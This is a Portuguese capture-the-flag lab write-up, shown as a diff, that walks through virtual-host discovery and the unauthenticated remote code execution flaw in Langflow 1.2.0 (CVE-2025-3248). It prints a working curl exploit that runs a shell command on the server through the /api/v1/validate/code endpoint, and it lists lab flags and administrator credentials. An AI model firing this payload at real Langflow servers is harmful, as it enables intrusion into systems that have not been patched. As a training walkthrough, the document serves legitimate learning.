@@ -1,0 +1,50 @@
+Flag 1: Identificação de Virtual Host (vHost)
+
+O que aprendemos: Servidores web podem hospedar vários sites no mesmo IP. Se você acessar apenas pelo IP, verá o site padrão. Para ver o site "escondido", você precisa informar o nome correto (o Host).
+Passo a Passo
+
+    Mapeamento Local: Como o domínio flow.projects-blogo.sy não existe na internet real, force o seu computador a encontrá-lo no IP do laboratório.
+
+        Edite o arquivo /etc/hosts (como root) e adicione:
+        Plaintext
+
+    3.89.86.52    flow.projects-blogo.sy
+
+Requisição do Cabeçalho: Vamos pedir apenas o cabeçalho (infos técnicas) da página:
+Bash
+
+curl -sI http://flow.projects-blogo.sy/
+
+Captura e Decodificação: No resultado, você verá uma linha chamada Flag:. O valor está em Base64 (um formato de codificação comum).
+
+    Comando para ler:
+    Bash
+
+        echo 'U29seWR7IUAjRDBtNGluQWNjM1NTM0QjKn0=' | base64 -d
+
+        Resultado: Solyd{!@#D0m4inAcc3SS3D#*}
+
+🚩 Flag 2: Exploração de RCE (CVE-2025-3248)
+
+O que aprendemos: Algumas versões de software (como o Langflow 1.2.0) possuem falhas que permitem executar comandos diretamente no sistema operacional sem estar logado.
+Passo a Passo
+
+    A Vulnerabilidade: O endpoint /api/v1/validate/code aceita código Python. Exploramos isso enviando um comando que força o servidor a ler o arquivo de flag e nos mostrar o erro.
+
+    Execução do Exploit:
+    Use o comando abaixo para ler o arquivo /flag.txt que está na raiz do servidor:
+    Bash
+
+    curl -sS -X POST 'http://3.89.86.52/api/v1/validate/code' \
+      -H 'Host: flow.projects-blogo.sy' \
+      -H 'Content-Type: application/json' \
+      -d '{"code": "@exec('\''raise Exception(__import__(\"subprocess\").check_output([\"cat\", \"/flag.txt\"]))'\'')\ndef foo():\n  pass"}'
+
+    Onde está a flag? O servidor vai responder com um erro (Exception). Dentro desse erro estará o conteúdo do arquivo: Solyd{0!FL0WFrOmOutsideTO1Ns1d3$%#}.
+
+🔑 Credenciais de Acesso (Pós-Exploração)
+
+Após conseguir executar comandos, é possível vasculhar o banco de dados interno (SQLite). Foram encontradas as seguintes credenciais para o painel administrativo:
+Usuário	Senha	Papel
+admin	blogo123	Superusuário
+langflow	langflow	Superusuário
